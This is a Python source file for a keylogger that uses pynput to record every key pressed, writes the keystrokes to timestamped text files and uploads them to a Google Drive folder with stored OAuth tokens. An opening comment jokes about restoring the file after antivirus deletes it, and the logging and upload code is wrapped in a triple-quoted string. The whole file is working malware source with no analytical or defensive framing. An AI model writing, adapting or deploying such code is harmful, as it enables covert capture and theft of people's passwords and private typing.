from turtle import up
from pynput.keyboard import Key, Listener
import time
import pickle
import os
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.http import MediaFileUpload

# Remember to restore file after antivirus removes it lmao.
"""
SCOPES = ['https://www.googleapis.com/auth/drive.metadata.readonly', 'https://www.googleapis.com/auth/drive.file']
UPDATE_THRESHOLD = 25
folder_id = None
key_count = 0
keys = []

# Creates a new folder for storing keylog files
def create_new_folder():
    service = get_drive_service()
    folder_details = {
        "name": "{time}Folder".format(time = time.strftime("%Y%m%d-%H%M%S")),
        "mimeType": "application/vnd.google-apps.folder"
    }
    file = service.files().create(body=folder_details, fields="id").execute()
    global folder_id
    folder_id = file.get("id")

# Uploads keylog files to new folder
def upload_files(filename):
    service = get_drive_service()
    file_details = {
        "name" : filename,
        "parents": [folder_id]
    }
    media = MediaFileUpload(filename, resumable=True)
    service.files().create(body=file_details, media_body=media, fields="id").execute()

# Authenticates code to Google Account
def get_drive_service():
    creds = None
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)
    # return Google Drive API service
    return build('drive', 'v3', credentials=creds)

def write_file(keys):
    global key_count
    with open("{time}_log.txt".format(time = time.strftime("%Y%m%d-%H%M%S")), "w") as log_file:
        for k in keys:
            k = k.replace("'", "")
            if k.find("backspace") > 0:
                log_file.write(" <- ")
            elif k.find("space") > 0:
                log_file.write(" ")
            elif k.find("enter") > 0:
                log_file.write("\n")
            else:
                log_file.write(k)
    filename = os.path.basename(log_file.name)
    log_file.close()
    upload_files(filename)

# Appends key pressed to a global list. After recording a set amount of keys
# they are put into a txt file and uploaded onto Google Drive
def on_press(key):
    global key_count, keys

    print("{0} pressed".format(key))
    keys.append(str(key))
    key_count += 1

    if key_count >= UPDATE_THRESHOLD:
        write_file(keys)
        keys.clear()
        key_count = 0

# Exits keylogger when esc key is pressed.
def on_release(key):
    global key_count, keys
    if key == Key.esc:
        write_file(keys)
        keys.clear()
        key_count = 0
        return False

def main():
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

if __name__ == "__main__":
    create_new_folder()
    main()
"""